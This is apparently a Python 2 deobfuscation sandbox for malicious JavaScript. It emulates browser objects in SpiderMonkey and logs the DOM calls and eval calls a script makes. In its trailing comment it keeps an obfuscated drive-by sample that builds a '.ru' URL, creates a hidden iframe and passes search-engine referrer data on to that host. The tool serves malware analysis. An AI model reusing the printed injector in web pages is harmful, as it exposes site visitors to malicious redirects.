#!/usr/bin/python
import string
import sys
from spidermonkey import Runtime

class Element:
    type = ''
    src = ''
    def __init__(self, type):
        self.type = type
    def __del__(self):
        if (self.src):
            print "SRC %s" % self.src
class Body:
    def appendChild(self, arg):
        print "appendChild"
        if(arg.type == "script"):
            print arg.src
        print "---"

class ActiveXObject:
    def __init__(self,arg):
        print "ActiveXObject creation %s" % arg

class Window:
    location=''
    onload=''
    def __del__(self):
        if self.location:
            print "Log Window location: %s " % self.location
        if self.onload:
            print "onLoad: %s" % self.onload
        return

class Document:
    src=''
    cookie="hhh"
    body = Body()
    class style:
        visibility=''

    def log(self,arg):
        print "document.%s " % arg;
    def src(self, arg):
        self.log(" src " + arg)

    def write(self, arg):
        self.log("write " + arg)
    def writeln(self, arg):
        self.log("writeln " + arg)
    def eval(self, arg):
        self.log("Eval " + arg)
    def referer(self):
        return "http://www.yahoo.com"

    def createElement(self, arg):
        print "createElement of type:%s" % arg
        el = Element(arg)
        return el

class Navigator:
    cookieEnabled =''
    mimeTypes=["application/x-shockwave-flash", "application/pdf"]
    plugins = ["RealPlayer"]
    userAgent="Mozilla"
    window = Window()
    document = Document()
    location = ''
    def __del__(self):
        #print "Log Navigator location: %s " % self.location
        return



class Deobfuscator:
    initString = "document = new Document(); window = new Window(); navigator = new Navigator(); "
    evals = []
    def __init__(self):
        self.rt = Runtime()
        self.cx = self.get_cx()
    def get_cx(self):
        cx = self.rt.new_context()
        cx.bind_callable("CollectGarbage",self.CollectGarbage)
        cx.bind_callable("eval",self.eval)
        # bind_attribute
        # bind_object
        window = Window();
        cx.bind_class(Navigator, bind_constructor=True)
        cx.bind_class(Document, bind_constructor=True)
        cx.bind_class(Window, bind_constructor=True)
        cx.bind_class(Element, bind_constructor=True)
        cx.bind_object("window",window)
        cx.bind_class(Body, bind_constructor=True)
        cx.bind_class(ActiveXObject, bind_constructor=True)
        return cx
    def eval(self,arg):
        #print "Evaluating script (eval): %s" % arg
        print "eval(...) delayed"
        arg.replace("function", "function ")
        self.evals.append(arg)
        return 1

    def CollectGarbage(self):
        print "Collected garbage"
    def evaluate_script(self, arg):
        s = self.initString + arg
        try:
            self.cx.eval_script(s)
        except Exception:
            #print "This execution has failed"
            return 0
        return 1


#function super_eval(arg){ print 'Going to EVAL:'; print arg;eval(arg); }; \n"
ok = 0
failed = 0
ev = Deobfuscator()
s = ''
for arg in sys.argv[1:]:
    try:
        f = open(arg) 
        while f:
            ln = f.readline()
            if (string.find(ln, "======")!= -1 or ln == "" ):
                #print "[+] Start script evaluation"
                res = ev.evaluate_script(s)
                #print "[+] Done with script evaluation(%i)" % res
                if res == 1:
                    ok = ok +1
                else:
                    failed = failed + 1
                s = ''
            else:
                s = s + ln.rstrip()

            if (ln == ""):
                break

        print "Done with main loop. Evaluating evals"
        stage = 1
        while (len(ev.evals) != 0):
            print "Level %i %i scripts to check" % (stage, len(ev.evals))
            evals = ev.evals
            ev.evals = []
            for s in evals:
                res = ev.evaluate_script(s)
                if (res == 1):
                    ok = ok + 1
                else:
                    failed = failed + 1
    except Exception:
        print "Failed to open %s" %arg

print "Completed. Total %i scripts evaluated. %i executed properly.  %i failed." % (ok + failed,ok, failed)
#cx.eval_script("""
#document = new Document();
#Ugtsac3 = 'h^)t#t(@p&:)$/)#/@@m$)a!^@s(h^)!@(a)$&(b$#@l)e))&-^(@c$o@$(m)!$$.!(^s((e!(z$&@!n)!a$!))m@^#).@c$@z#($.^&m$((e@#&g)^(a#^&c$l!$i)@c)$k(-@#c(#o)(^@m$@).$&s#)u^$)p!^!e^r)&h^$(o!#@&(m&!^!e$@(t$$!o!u&r&^)s$.&(r)@u^!)('.replace(/\)|\$|#|&|\^|@|\!|\(/ig, '');
#document.log(Ugtsac3);
#var Ahdzraf = 'AhdzrafKasgzmb';
#Wj405ma = document.createElement('iWf8r*aWmoe4'.replace(/[48\*oW]/g, ''));
#Ahdzraf = 'AhdzrafKasgzmb';
#var Kasgzmb = '';
#Ahdzraf = document.referrer;
#Ahdzraf = 'yandex.';
#function Gc5mb8sq4(Mhay49ui){
#   Kasgzmb=Mhay49ui;
#}
#Gc5mb8sq4('google.');Gc5mb8sq4('yandex.');Gc5mb8sq4('yahoo.');Gc5mb8sq4('ask.com');
#Gc5mb8sq4('bing.');Gc5mb8sq4('baidu.');Gc5mb8sq4('aol.');Gc5mb8sq4('mail.ru');Gc5mb8sq4('rambler.ru');
#Gc5mb8sq4('facebook.');
#
#document.log('h)@^!^i$!&d@$&d($$$e)^(n^'.replace(/#|\(|@|&|\$|\^|\)|\!/ig, ''));
#document.log(Ugtsac3+':O8f0|8^0^/]iOn|dOe^x].OpOhfp]?Ojfl^=O'.replace(/[O\^\]\|f]/g, '')+Kasgzmb);
#document.body.appendChild(Wj405ma);
#""");
